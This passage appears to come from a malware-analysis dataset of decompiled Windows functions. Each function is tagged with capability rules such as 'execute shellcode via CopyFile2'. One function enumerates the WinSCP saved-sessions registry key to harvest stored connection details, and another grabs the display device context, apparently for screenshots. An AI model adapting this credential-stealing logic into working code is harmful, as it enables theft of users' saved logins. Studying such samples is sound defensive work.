&stack0xffffff58;\n    uStack188 = *0x44d6a0 ^ &stack0xffffff48;\n    *in_FS_OFFSET = &stack0xfffffff4;\n    uStack132 = param_3;\n    uStack136 = param_2;\n    puStack160 = param_1;\n    uStack144 = 0;\n    uStack168 = 0;\n    uStack164 = 0;\n    uStack80 = 0xf;\n    uStack84 = 0;\n    uStack100 = 0;\n    uStack108 = 0xf;\n    uStack112 = 0;\n    uStack128 = uStack128 & 0xffffff00;\n    puStack192 = &stack0xffffff5c;\n    arg_8h = &stack0xffffff58;\n    uStack200 = param_4;\n    uStack4 = 1;\n    puStack160 = fcn.00417580();\n    uVar10 = 8;\n    puVar4 = (**0x45fff4)(8, unaff_EBP);\n    iVar5 = (**0x45ff7c)(puVar4);\n    if (iVar5 == 0) {\n        if (puStack192 != NULL) {\n            uVar10 = (**0x45fff4)(0, puStack192);\n            (**0x460020)(uVar10);\n        }\n        *(param_1 + 0x14) = 0xf;\n        *(param_1 + 0x10) = 0;\n        *param_1 = 0;\n        fcn.004052f0();\n        if (0xf < uStack140) {\n            fcn.00427a17(puStack160);\n        }\n        uStack140 = 0xf;\n        uStack144 = 0;\n        puStack160 = puStack160 & 0xffffff00;\n        if (0xf < uStack112) {\n            fcn.00427a17(uStack132);\n        }\n        goto code_r0x00418fd8;\n    }\n    fcn.00427d91(iVar5, uStack188, puStack192);\n    if (puStack192 != NULL) {\n        uVar6 = (**0x45fff4)(0, puStack192);\n        (**0x460020)(uVar6);\n        puStack192 = NULL;\n    }\n    if (unaff_EBX == 0xff) {\n        fcn.00417580(iVar5, &stack0xffffff40, &stack0xffffff44);\n        uVar6 = (**0x45fff4)(0, iVar5);\n        (**0x460020)(uVar6);\n        uVar6 = (**0x45fff4)(8, puVar4);\n        iVar5 = (**0x45ff7c)(uVar6);\n        if (iVar5 == 0) {\n            if (uStack188 != 0) {\n                uVar10 = (**0x45fff4)(0, uStack188);\n                (**0x460020)(uVar10);\n            }\n            *(param_1 + 0x14) = 0xf;\n            *(param_1 + 0x10) = 0;\n            *param_1 = 0;\n            fcn.004052f0(0x445667, 0);\n            if (0xf < uStack136) {\n                fcn.00427a17(uStack156);\n            }\n            uStack136 = 0xf;\n            uStack140 = 0;\n            uStack156 = uStack156 & 0xffffff00;\n            if (0xf < uStack108) {\n                fcn.00427a17(uStack128);\n            }\n            goto code_r0x00418fd8;\n        }\n        fcn.00427d91(iVar5, unaff_EDI, uStack188);\n        if (uStack188 != 0) {\n            uVar6 = (**0x45fff4)(0, uStack188);\n            (**0x460020)(uVar6);\n            uStack188 = 0;\n        }\n        puVar4 = &stack0xffffff48;\n        unaff_EDI = fcn.00417580(iVar5, &stack0xffffff44, puVar4);\n        uVar6 = (**0x45fff4)(0, iVar5);\n        (**0x460020)(uVar6);\n        uVar6 = (**0x45fff4)(8, uVar10);\n        iVar5 = (**0x45ff7c)(uVar6);\n        if (iVar5 == 0) {\n            if (puStack192 != NULL) {\n                uVar10 = (**0x45fff4)(0, puStack192);\n                (**0x460020)(uVar10);\n            }\n            fcn.004053e0(0x44566d);\n            fcn.0040ab60();\n            fcn.0040ab60();\n            goto code_r0x00418fd8;\n        }\n        fcn.00427d91(iVar5, uStack188, puStack192);\n        if (puStack192 != NULL) {\n            uVar6 = (**0x45fff4)(0, puStack192);\n            (**0x460020)(uVar6);\n            puStack192 = NULL;\n        }\n    }\n    iVar7 = fcn.00417580(iVar5, &stack0xffffff40, &stack0xffffff44);\n    uVar6 = (**0x45fff4)(0, iVar5);\n    (**0x460020)(uVar6);\n    uVar6 = (**0x45fff4)(8, puVar4);\n    iVar5 = (**0x45ff7c)(uVar6);\n    uVar3 = uStack188;\n    if (iVar5 == 0) {\n        if (uStack188 != 0) {\n            uVar10 = (**0x45fff4)(0, uStack188);\n            (**0x460020)(uVar10);\n        }\n        *(param_1 + 0x14) = 0xf;\n        *(param_1 + 0x10) = 0;\n        *param_1 = 0;\n        fcn.004052f0(0x44566e, 0);\n        if (0xf < uStack136) {\n            fcn.00427a17(uStack156);\n        }\n        uStack136 = 0xf;\n        uStack140 = 0;\n        uStack156 = uStack156 & 0xffffff00;\n        if (0xf < uStack108) {\n            fcn.00427a17(uStack128);\n        }\n    }\n    else {\n        fcn.00427d91(iVar5, unaff_EDI, uStack188);\n        if (uVar3 != 0) {\n            uVar6 = (**0x45fff4)(0, uVar3);\n            (**0x460020)(uVar6);\n        }\n        iVar8 = (**0x45fe90)(iVar5);\n        uStack188 = iVar8 + iVar7 * -2 + 1;\n        uVar6 = (**0x45fff4)(8, uStack188);\n        iVar8 = (**0x45ff7c)(uVar6);\n        if (iVar8 == 0) {\n            fcn.004053e0(0x44566f);\n            if (0xf < uStack136) {\n                fcn.00427a17(uStack156);\n            }\n            uStack136 = 0xf;\n            uStack140 = 0;\n            uStack156 = uStack156 & 0xffffff00;\n            if (0xf < uStack108) {\n                fcn.00427a17(uStack128);\n            }\n        }\n        else {\n            puVar4 = fcn.004053e0(iVar5);\n            uStack32 = 2;\n            arg_ch = iVar5;\n            uVar6 = (**0x45fe90)();\n            arg_10h = fcn.0040d1d0(&stack0xffffffb4, iVar7 * 2, uVar6);\n            if (0xf < arg_10h[5]) {\n                arg_10h = *arg_10h;\n            }\n            fcn.00427d91(iVar8, uVar10, arg_10h);\n            if (0xf < uStack68) {\n                fcn.00427a17(uStack88);\n            }\n            uStack68 = 0xf;\n            uStack72 = 0;\n            uStack88 = uStack88 & 0xffffff00;\n            uStack48 = 1;\n            if (0xf < uStack96) {\n                fcn.00427a17(uStack116);\n            }\n            uVar10 = (**0x45fff4)(0, iVar5);\n            (**0x460020)(uVar10);\n            iVar5 = (**0x45fe90)(iVar8);\n            uVar10 = (**0x45fff4)(8, iVar5 + 1);\n            iVar7 = (**0x45ff7c)(uVar10);\n            if (iVar7 == 0) {\n                uVar10 = (**0x45fff4)(0);\n                (**0x460020)(uVar10);\n                fcn.004053e0(0x445672);\n                fcn.0040ab60();\n                fcn.0040ab60();\n            }\n            else {\n                fcn.00427d91(iVar7, iVar5 + 1, iVar8);\n                uVar10 = (**0x45fff4)(0, iVar8);\n                (**0x460020)(uVar10);\n                uStack200 = 0;\n                uStack188 = 0;\n                if (0 < puVar4) {\n                    do {\n                        uStack188 = fcn.00417580(iVar7, &stack0xffffff38, &stack0xffffff3c);\n                        uVar10 = (**0x45fff4)(0, iVar7);\n                        (**0x460020)(uVar10);\n                        uVar10 = (**0x45fff4)(8, arg_ch);\n                        iVar7 = (**0x45ff7c)(uVar10);\n                        puVar2 = puStack192;\n                        if (iVar7 == 0) {\n                            if (puStack192 != NULL) {\n                                uVar10 = (**0x45fff4)(0, puStack192);\n                                (**0x460020)(uVar10);\n                            }\n                            fcn.004053e0(0x445673);\n                            if (0xf < uStack136) {\n                                fcn.00427a17(uStack156);\n                            }\n                            goto code_r0x00418fbf;\n                        }\n                        fcn.00427d91(iVar7, arg_ch, puStack192);\n                        if (puVar2 != NULL) {\n                            uVar10 = (**0x45fff4)(0, puVar2);\n                            (**0x460020)(uVar10);\n                            puStack192 = NULL;\n                        }\n                        arg_ch = 1;\n                        fcn.0040abc0(1, uStack168);\n                        uStack188 = uStack188 + 1;\n                    } while (uStack188 < puVar4);\n                }\n                if (unaff_ESI == 0xff) {\n                    uVar10 = fcn.004053e0(uStack168);\n                    uStack40 = CONCAT31(uStack40._1_3_, 3);\n                    fcn.00405420(uVar10);\n                    uStack44 = 1;\n                    if (0xf < uStack92) {\n                        fcn.00427a17(uStack112);\n                    }\n                    pcVar9 = unaff_EBX;\n                    do {\n                        cVar1 = *pcVar9;\n                        pcVar9 = pcVar9 + 1;\n                    } while (cVar1 != '\\0');\n                    fcn.0040ac70(unaff_EBX, pcVar9 - (unaff_EBX + 1));\n                    uVar10 = fcn.0040d1d0(&stack0xffffff88, puStack160, uStack132);\n                    uStack64 = 4;\n                    fcn.00405420(uVar10);\n                    uStack68 = CONCAT31(uStack68._1_3_, 1);\n                    if (0xf < uStack116) {\n                        fcn.00427a17(uStack136);\n                    }\n                }\n                uVar10 = (**0x45fff4)(0, iVar7);\n                (**0x460020)(uVar10);\n                *(puVar4 + 0x14) = 0xf;\n                *(puVar4 + 0x10) = 0;\n                *puVar4 = 0;\n                fcn.00405420(&stack0xffffff84);\n                if (0xf < uStack136) {\n                    fcn.00427a17(uStack156);\n                }\ncode_r0x00418fbf:\n                uStack136 = 0xf;\n                uStack156 = uStack156 & 0xffffff00;\n                uStack140 = 0;\n                if (0xf < uStack108) {\n                    fcn.00427a17(uStack128);\n                }\n            }\n        }\n    }\ncode_r0x00418fd8:\n    *in_FS_OFFSET = uStack40;\n    uStack200 = 0x418ff9;\n    fcn.00427841(arg_8h);\n    return;\n}\n",
        "token_count": 3368
    },
    "00419010": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00419010(char *param_1)\n\n{\n    char cVar1;\n    char *arg_8h;\n    int32_t iVar2;\n    char *pcVar3;\n    uint uVar4;\n    uchar *puVar5;\n    uint32_t unaff_EBP;\n    int32_t *in_FS_OFFSET;\n    uint uVar6;\n    uint uStack3800;\n    int32_t iStack3796;\n    uchar *puStack3792;\n    uint uStack3788;\n    uint uStack3784;\n    uint uStack3780;\n    uchar *puStack3776;\n    uchar *puStack3772;\n    char *pcStack3768;\n    uchar *puStack3764;\n    uint *puStack3760;\n    uchar *puStack3756;\n    uint32_t uStack3752;\n    int32_t iStack3748;\n    uint uStack3744;\n    uchar *puStack3740;\n    uchar *puStack3736;\n    char *pcStack3732;\n    uint uStack3728;\n    char *pcStack3724;\n    uint uStack3720;\n    char *pcStack3716;\n    uint *puStack3712;\n    char *pcStack3708;\n    uchar *puStack3704;\n    uint32_t uStack3700;\n    uchar *puStack3696;\n    uint uStack3692;\n    uint uStack3688;\n    uint uStack3684;\n    char16_t *pcStack3680;\n    uchar *puStack3676;\n    char *pcStack3672;\n    uchar *puStack3668;\n    int32_t iStack3664;\n    int32_t **ppiStack3660;\n    uint *puStack3656;\n    uint32_t uStack3652;\n    uint uStack3648;\n    uchar *puStack3644;\n    uint uStack3640;\n    char *pcStack3636;\n    uchar *puStack3632;\n    char *pcStack3628;\n    uchar *puStack3624;\n    char *pcStack3620;\n    int32_t iStack3616;\n    char *pcStack3612;\n    char *pcStack3608;\n    uint uStack3604;\n    uint uStack3600;\n    uchar *puStack3596;\n    uint uStack3592;\n    uchar *puStack3588;\n    uchar auStack3564 [8];\n    uint uStack3556;\n    uint uStack3552;\n    uint32_t uStack3548;\n    uint uStack3544;\n    uint32_t uStack3540;\n    char *pcStack3536;\n    uchar auStack3532 [4];\n    uint uStack3528;\n    uint uStack3524;\n    uint32_t uStack3520;\n    uint32_t uStack3516;\n    uint uStack3512;\n    uint uStack3500;\n    uint uStack3496;\n    uint32_t uStack3492;\n    uchar auStack3468 [12];\n    uint32_t uStack3456;\n    uchar uStack3452;\n    uint uStack3440;\n    uint32_t uStack3436;\n    uint uStack3432;\n    char acStack3420 [20];\n    int32_t aiStack3400 [8];\n    char acStack3368 [20];\n    uchar uStack3348;\n    uchar auStack3347 [23];\n    uchar auStack3324 [8];\n    uchar auStack3316 [44];\n    uchar auStack3272 [184];\n    uchar auStack3088 [788];\n    uchar auStack2300 [60];\n    uchar auStack2240 [28];\n    uchar auStack2212 [148];\n    char acStack2064 [788];\n    uchar auStack1276 [156];\n    uchar auStack1120 [28];\n    uchar auStack1092 [52];\n    uchar auStack1040 [780];\n    uchar uStack260;\n    uchar uStack256;\n    uint uStack188;\n    uint uStack136;\n    uint uStack128;\n    uint uStack84;\n    uchar uStack56;\n    uchar uStack48;\n    uchar uStack40;\n    int32_t iStack32;\n    uint uStack24;\n    uint32_t uStack16;\n    int32_t iStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x43b87d;\n    iStack12 = *in_FS_OFFSET;\n    uStack16 = *0x44d6a0 ^ &stack0xfffff214;\n    arg_8h = *0x44d6a0 ^ &stack0xfffff204;\n    *in_FS_OFFSET = &stack0xfffffff4;\n    puStack3588 = 0x103;\n    puStack3596 = &stack0xfffff2ed;\n    uStack3592 = 0;\n    uStack3552 = 0;\n    uStack3348 = 0;\n    uStack3600 = 0x419076;\n    fcn.00427390();\n    uStack3600 = 0x400;\n    pcStack3608 = &stack0xfffffbf0;\n    uStack3604 = 0;\n    uStack3556 = 0x104;\n    pcStack3612 = 0x419092;\n    fcn.00427390();\n    pcStack3612 = 0x400;\n    pcStack3620 = &stack0xfffff7f0;\n    iStack3616 = 0;\n    puStack3624 = 0x4190a1;\n    fcn.00427390();\n    puStack3624 = 0x400;\n    puStack3632 = &stack0xfffff3f0;\n    pcStack3628 = NULL;\n    pcStack3636 = 0x4190b0;\n    fcn.00427390();\n    puStack3588 = &stack0xfffff214;\n    uStack3592 = 1;\n    puStack3596 = NULL;\n    uStack3600 = 0x4458a0;\n    uStack3604 = 0x80000001;\n    uStack3528 = 0x400;\n    uStack3544 = 0x400;\n    uStack3540 = 0x400;\n    pcStack3608 = 0x4190d7;\n    iVar2 = (**0x460024)();\n    if (iVar2 != 0) goto code_r0x004195bf;\n    uStack3432 = 0xf;\n    uStack3436 = 0;\n    uStack3452 = 0;\n    pcStack3608 = *0x44f0fc;\n    do {\n        cVar1 = *pcStack3608;\n        pcStack3608 = pcStack3608 + 1;\n    } while (cVar1 != '\\0');\n    pcStack3608 = pcStack3608 + -(*0x44f0fc + 1);\n    pcStack3612 = *0x44f0fc;\n    iStack3616 = 0x41911b;\n    fcn.004052f0();\n    uStack3496 = 0xf;\n    iStack32 = 0;\n    uStack3500 = 0;\n    uStack3516 = uStack3516 & 0xffffff00;\n    pcVar3 = *0x44f2c0;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    iStack3616 = pcVar3 - (*0x44f2c0 + 1);\n    pcStack3620 = *0x44f2c0;\n    puStack3624 = 0x419154;\n    fcn.004052f0();\n    puStack3624 = &stack0xfffff274;\n    pcStack3628 = &stack0xfffff258;\n    uStack40 = 1;\n    puStack3632 = 0x419175;\n    puStack3656 = fcn.00420620();\n    puStack3632 = &stack0xfffff234;\n    pcStack3636 = &stack0xfffff2a4;\n    uStack48 = 2;\n    uStack3640 = 0x419195;\n    ppiStack3660 = fcn.00420620();\n    uStack56 = 3;\n    if (7 < puStack3656[5]) {\n        puStack3656 = *puStack3656;\n    }\n    if (0x7 < ppiStack3660[5]) {\n        ppiStack3660 = *ppiStack3660;\n    }\n    uStack3640 = &stack0xfffff20c;\n    puStack3644 = &stack0xfffff200;\n    uStack3648 = 0;\n    uStack3652 = 0x10;\n    iStack3664 = iStack3616;\n    puStack3668 = 0x4191ca;\n    iVar2 = (**0x45fde0)();\n    uStack3640 = uStack3640 & 0xffffff | (iVar2 != 0) << 0x18;\n    if (7 < uStack3436) {\n        puStack3668 = uStack3456;\n        pcStack3672 = 0x4191e7;\n        fcn.00427a17();\n    }\n    uStack3436 = 7;\n    uStack3440 = 0;\n    uStack3456 = uStack3456 & 0xffff0000;\n    if (7 < uStack3520) {\n        puStack3668 = uStack3540;\n        pcStack3672 = 0x41921a;\n        fcn.00427a17();\n    }\n    uStack3520 = 7;\n    uStack3524 = 0;\n    uStack3540 = uStack3540 & 0xffff0000;\n    if (0xf < uStack3548) {\n        pcStack3672 = 0x419247;\n        fcn.00427a17();\n    }\n    uStack3548 = 0xf;\n    uStack3552 = 0;\n    uStack84 = 0xffffffff;\n    if (0xf < uStack3492) {\n        puStack3668 = uStack3512;\n        pcStack3672 = 0x41927b;\n        fcn.00427a17();\n    }\n    if (uStack3640._3_1_ == '\\0') {\ncode_r0x00419299:\n        if (puStack3644 != NULL) {\n            pcStack3672 = 0x4192a4;\n            puStack3668 = puStack3644;\n            (**0x45ff48)();\n            puStack3644 = NULL;\n        }\n    }\n    else if (puStack3644 != NULL) {\n        puStack3668 = puStack3644;\n        pcStack3672 = 0x419293;\n        (**0x45ff48)();\n        puStack3644 = NULL;\n        goto code_r0x00419299;\n    }\n    puStack3668 = &stack0xfffff1c4;\n    pcStack3672 = 0x9;\n    puStack3676 = NULL;\n    pcStack3680 = L\"Software\\\\Martin Prikryl\\\\WinSCP 2\\\\Sessions\";\n    uStack3684 = 0x80000001;\n    uStack3688 = 0x4192c0;\n    iVar2 = (**0x460024)();\n    if (iVar2 == 0) {\n        pcStack3608 = NULL;\n        pcStack3612 = NULL;\n        iStack3616 = 0;\n        pcStack3620 = NULL;\n        puStack3624 = &stack0xfffff208;\n        pcStack3628 = &stack0xfffff2d8;\n        puStack3632 = NULL;\n        uStack3640 = 0x4192e5;\n        pcStack3636 = arg_8h;\n        iVar2 = (**0x45ffec)();\n        if (iVar2 == 0) {\n            do {\n                pcStack3608 = 0x44589c;\n                pcStack3612 = param_1;\n                iStack3616 = 0x4192f9;\n                (**0x45ff98)();\n                iStack3616 = *0x44eca0;\n                pcStack3620 = param_1;\n                puStack3624 = 0x419307;\n                (**0x45ff98)();\n                puStack3624 = 0x445954;\n                pcStack3628 = param_1;\n                puStack3632 = 0x419313;\n                (**0x45ff98)();\n                puStack3632 = *0x44f214;\n                pcStack3636 = param_1;\n                uStack3640 = 0x419320;\n                (**0x45ff98)();\n                uStack3640 = &stack0xfffff204;\n                puStack3644 = &stack0xfffffbbc;\n                uStack3648 = 0;\n                uStack3652 = 2;\n                puStack3656 = *0x44ec00;\n                ppiStack3660 = &stack0xfffff2b8;\n                iStack3664 = iStack3616;\n                puStack3668 = 0x419349;\n                (**0x45fe80)();\n                puStack3668 = &stack0xfffffba0;\n                pcStack3672 = param_1;\n                puStack3676 = 0x419358;\n                (**0x45ff98)();\n                puStack3676 = &stack0xfffff1d8;\n                pcStack3680 = &stack0xfffff1e4;\n                uStack3684 = 0;\n                uStack3688 = 0xffff;\n                uStack3692 = *0x44ed58;\n                puStack3696 = &stack0xfffff294;\n                uStack3700 = uStack3652;\n                puStack3624 = 0x4;\n                puStack3704 = 0x41938a;\n                iVar2 = (**0x45fe80)();\n                if (iVar2 == 0) {\n                    puStack3704 = uStack3640;\n                    pcStack3708 = &stack0xfffff208;\n                    puStack3712 = 0x4193a4;\n                    puStack3712 = fcn.00420d50();\n                    uStack128 = 4;\n                    if (0xf < puStack3712[5]) {\n                        puStack3712 = *puStack3712;\n                    }\n                    pcStack3716 = param_1;\n                    uStack3720 = 0x4193ba;\n                    (**0x45ff98)();\n                    uStack136 = 0xffffffff;\n                    if (0xf < unaff_EBP) {\n                        uStack3720 = uStack3592;\n                        pcStack3724 = 0x4193d8;\n                        fcn.00427a17();\n                    }\n                }\n                else {\n                    puStack3704 = 0x445958;\n                    pcStack3708 = param_1;\n                    puStack3712 = 0x4193e9;\n                    (**0x45ff98)();\n                }\n                uStack3720 = 0x44595c;\n                pcStack3724 = param_1;\n                uStack3728 = 0x4193f5;\n                (**0x45ff98)();\n                uStack3728 = *0x44ecf8;\n                pcStack3732 = param_1;\n                puStack3736 = 0x419402;\n                (**0x45ff98)();\n                puStack3736 = &stack0xfffff194;\n                puStack3740 = &stack0xfffff75c;\n                uStack3744 = 0;\n                iStack3748 = 2;\n                uStack3752 = *0x44f290;\n                puStack3756 = &stack0xfffff258;\n                puStack3760 = puStack3712;\n                puStack3764 = 0x41942b;\n                (**0x45fe80)();\n                puStack3764 = &stack0xfffff740;\n                pcStack3768 = param_1;\n                puStack3772 = 0x41943a;\n                (**0x45ff98)();\n                pcStack3680 = 0xf;\n                uStack3684 = 0;\n                uStack3700 = uStack3700 & 0xffffff00;\n                puStack3772 = &stack0xfffff174;\n                puStack3776 = &stack0xfffff338;\n                uStack3780 = 0;\n                uStack3784 = 2;\n                uStack3788 = *0x44ee74;\n                puStack3792 = &stack0xfffff234;\n                iStack3796 = iStack3748;\n                uStack188 = 5;\n                uStack3800 = 0x41947f;\n                (**0x45fe80)();\n                uStack3800 = 0x445960;\n                (**0x45ff98)(param_1);\n                uVar6 = *0x44f1d4;\n                (**0x45ff98)(param_1, *0x44f1d4);\n                iVar2 = (**0x45ffc8)(&stack0xfffff30c, 0x445677);\n                if (iVar2 != 0) {\n                    uVar4 = fcn.00418850(&stack0xfffff1c8, &stack0xfffffb04, &stack0xfffff704, &stack0xfffff304);\n                    uStack256 = 6;\n                    fcn.00405420(uVar4);\n                    uStack260 = 5;\n                    if (0xf < uStack3640) {\n                        fcn.00427a17(ppiStack3660);\n                    }\n                    uStack3640 = 0xf;\n                    puStack3644 = NULL;\n                    ppiStack3660 = ppiStack3660 & 0xffffff00;\n                    puVar5 = puStack3772;\n                    if (uStack3752 < 0x10) {\n                        puVar5 = &stack0xfffff144;\n                    }\n                    (**0x45ff98)(param_1, puVar5);\n                }\n                (**0x45ff98)(param_1, 0x445964);\n                iStack3796 = iStack3796 + 1;\n                uStack3800 = 0x104;\n                iVar2 = (**0x45ffec)(uVar6, iStack3796, &stack0xfffff1f8, &stack0xfffff128, 0, 0, 0, 0);\n                uStack24 = 0xffffffff;\n                if (0xf < uStack3516) {\n                    pcStack3608 = pcStack3536;\n                    pcStack3612 = 0x419591;\n                    fcn.00427a17();\n                }\n                uStack3516 = 0xf;\n                uStack3520 = 0;\n                pcStack3536 = pcStack3536 & 0xffffff00;\n            } while (iVar2 != 0x103);\n        }\n        if (arg_8h != NULL) {\n            pcStack3612 = 0x4195bf;\n            pcStack3608 = arg_8h;\n            (**0x45ff48)();\n        }\n    }\ncode_r0x004195bf:\n    *in_FS_OFFSET = iStack32;\n    puStack3588 = 0x4195e0;\n    fcn.00427841(arg_8h);\n    return;\n}\n",
        "token_count": 4275
    },
    "0041cb10": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.0041cb10(uint32_t param_1)\n\n{\n    uint32_t arg_8h;\n    uint uVar1;\n    uint uVar2;\n    uint unaff_EDI;\n    int32_t *in_FS_OFFSET;\n    uint32_t uVar3;\n    uint32_t uStack184;\n    uint uStack180;\n    char *pcStack176;\n    uint uStack172;\n    uint uStack168;\n    uint32_t uStack164;\n    uint32_t uStack160;\n    uint uStack140;\n    uint32_t uStack136;\n    uint uStack132;\n    uint32_t uStack128;\n    uint uStack112;\n    uint32_t uStack108;\n    uint uStack100;\n    uchar auStack84 [4];\n    uint32_t uStack80;\n    int32_t iStack68;\n    uchar uStack60;\n    uint uStack52;\n    uint32_t uStack16;\n    int32_t iStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x43bcf0;\n    iStack12 = *in_FS_OFFSET;\n    uStack16 = *0x44d6a0 ^ &stack0xffffff74;\n    uStack160 = *0x44d6a0 ^ &stack0xffffff64;\n    *in_FS_OFFSET = &stack0xfffffff4;\n    uStack164 = 0;\n    uStack168 = 0;\n    uStack172 = 0;\n    pcStack176 = \"DISPLAY\";\n    uStack136 = param_1;\n    uStack132 = 0;\n    uStack180 = 0x41cb67;\n    arg_8h = (**0x45ff4c)();\n    uStack180 = 8;\n    uStack184 = arg_8h;\n    uVar1 = (**0x45fee0)();\n    uVar3 = arg_8h;\n    uVar2 = (**0x45fee0)(arg_8h, 10);\n    (**0x45ff9c)(0);\n    uVar2 = fcn.00420d50(&stack0xffffffac, uVar2);\n    uStack52 = 0;\n    uVar1 = fcn.00420d50(&stack0xffffff6c, uVar1);\n    uStack60 = 1;\n    uVar1 = fcn.004054c0(&stack0xffffff80, 0x446092, uVar1);\n    uStack60 = 2;\n    uVar1 = fcn.0040d210(&stack0xffffff48, uVar1, 0x4461dc);\n    uStack60 = 3;\n    fcn.00405510(uVar3, uVar1, uVar2);\n    if (0xf < uStack164) {\n        fcn.00427a17(uStack184);\n    }\n    uStack164 = 0xf;\n    uStack168 = 0;\n    uStack184 = uStack184 & 0xffffff00;\n    if (0xf < uStack108) {\n        fcn.00427a17(uStack128);\n    }\n    uStack108 = 0xf;\n    uStack112 = 0;\n    uStack128 = uStack128 & 0xffffff00;\n    if (0xf < uStack136) {\n        fcn.00427a17(unaff_EDI);\n    }\n    uStack136 = 0xf;\n    uStack140 = 0;\n    if (0xf < uStack80) {\n        fcn.00427a17(uStack100);\n    }\n    *in_FS_OFFSET = iStack68;\n    fcn.00427841(arg_8h);\n    return;\n}\n",
        "token_count": 814
    },
    "0041edc0": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0041edc0(uint param_1, uint param_2, uint param_3, uint param_4, uint ***param_5, uint param_6, \n                 uint ****param_7, uint param_8, uint ***param_9, int32_t param_10, int32_t param_11)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    uint **ppuVar3;\n    uint uVar4;\n    uint ***pppuVar5;\n    uint arg_8h;\n    uint8_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    int32_t *piVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    uint ****arg_8h_00;\n    uint **ppuVar12;\n    uint uVar13;\n    int32_t unaff_EBX;\n    int32_t unaff_EBP;\n    uint *puVar14;\n    int32_t *piVar15;\n    uint unaff_EDI;\n    uint ****ppppuVar16;\n    int32_t **in_FS_OFFSET;\n    uint unaff_retaddr;\n    uint32_t uStack124;\n    int32_t iStack120;\n    uint uStack116;\n    uint ***pppuStack112;\n    uint ***pppuStack108;\n    int32_t *piStack104;\n    uint ***pppuStack100;\n    int32_t *piStack96;\n    uint uStack88;\n    uint ****ppppuStack84;\n    uchar auStack80 [4];\n    uint uStack76;\n    int32_t iStack68;\n    uint32_t uStack64;\n    uint ****ppppuStack56;\n    int32_t aiStack52 [4];\n    uint32_t uStack36;\n    int32_t *piStack24;\n    uint uStack16;\n    int32_t *piStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x43bfc8;\n    piStack12 = *in_FS_OFFSET;\n    uStack16 = *0x44d6a0 ^ &uStack124;\n    uVar7 = *0x44d6a0 ^ &stack0xffffff74;\n    *in_FS_OFFSET = &piStack12;\n    uStack116 = param_8;\n    uStack76 = param_2;\n    pppuStack100 = param_5;\n    ppppuStack84 = param_9;\n    iStack120 = param_10;\n    uVar8 = fcn.00412730(auStack80);\n    uStack8 = 0;\n    piVar9 = fcn.0041e740();\n    pppuVar5 = ppppuStack84;\n    uStack8 = 0xffffffff;\n    piStack96 = piVar9;\n    if (ppppuStack84 != NULL) {\n        uVar8 = 0;\n        pppuStack100 = ppppuStack84;\n        fcn.00426b13(0);\n        ppuVar3 = pppuVar5[1];\n        if ((ppuVar3 != NULL) && (ppuVar3 != 0xffffffff)) {\n            pppuVar5[1] = ppuVar3 + -1;\n        }\n        ppuVar3 = pppuVar5[1];\n        fcn.00426b3b();\n        puVar14 = ~-(ppuVar3 != NULL) & piStack104;\n        param_5 = pppuStack108;\n        if (puVar14 != NULL) {\n            (***puVar14)(1);\n            param_5 = pppuStack108;\n        }\n    }\n    piVar15 = aiStack52;\n    fcn.0041e390(piVar15);\n    uStack16 = 1;\n    uVar6 = (**(*piVar9 + 8))();\n    pppuStack108 = pppuStack108 & 0xffffff00 | uVar6;\n    uStack64 = 0xf;\n    iStack68 = 0;\n    ppppuStack84 = ppppuStack84 & 0xffffff00;\n    uStack16 = CONCAT31(uStack16._1_3_, 2);\n    if ((*param_7 == '+') || (iStack120 = 0,  *param_7 == '-')) {\n        iStack120 = 1;\n    }\n    puVar14 = fcn.00429a50();\n    uStack124._0_3_ = CONCAT21(0x65, **puVar14);\n    uStack124 = uStack124 & 0xff000000 | uStack124;\n    iVar10 = fcn.00428750(param_7, 0x65, param_11);\n    iVar11 = fcn.00428750(param_7, uStack124, param_11);\n    if (iVar11 == 0) {\n        unaff_EBP = iVar11;\n    }\n    ppppuVar16 = ppppuStack56;\n    if (uStack36 < 0x10) {\n        ppppuVar16 = &ppppuStack56;\n    }\n    if (*ppppuVar16 != '\\x7f') {\n        ppppuVar16 = ppppuStack56;\n        if (uStack36 < 0x10) {\n            ppppuVar16 = &ppppuStack56;\n        }\n        if ('\\0' < *ppppuVar16) {\n            fcn.0040ac70(param_7, param_11);\n            if (iVar10 == 0) {\n                uVar7 = uVar8;\n                fcn.0040abc0(unaff_EDI, 0x30);\n            }\n            else {\n                if (uVar7 == 0) {\n                    fcn.0040abc0(iVar11, 0x30);\n                }\n                uStack124 = 0x30;\n                fcn.0041e650();\n            }\n            if (uVar7 == 0) {\n                piVar15 = piStack104;\n                fcn.0040abc0();\n            }\n            else {\n                piVar15 = uVar7 - param_7;\n                fcn.0041e650(piVar15 + 1);\n                fcn.0041e650(piVar15, uStack116, 0x30);\n                piStack96 = NULL;\n            }\n            unaff_EBX = 0;\n            ppppuVar16 = ppppuStack56;\n            if (uStack36 < 0x10) {\n                ppppuVar16 = &ppppuStack56;\n            }\n            arg_8h_00 = ppppuStack84;\n            if (uStack64 < 0x10) {\n                arg_8h_00 = &ppppuStack84;\n            }\n            piVar9 = fcn.00429a80(arg_8h_00, &uStack124);\n            cVar2 = *ppppuVar16;\n            param_5 = pppuStack112;\n            param_11 = iStack68;\n            while (((pppuStack112 = param_5,  iStack68 = param_11,  cVar2 != '\\x7f' && ('\\0' < cVar2)) &&\n                   (cVar2 < piVar9 - iStack120))) {\n                piVar9 = piVar9 - cVar2;\n                piVar15 = piVar9;\n                fcn.0041e650();\n                if ('\\0' < *(ppppuVar16 + 1)) {\n                    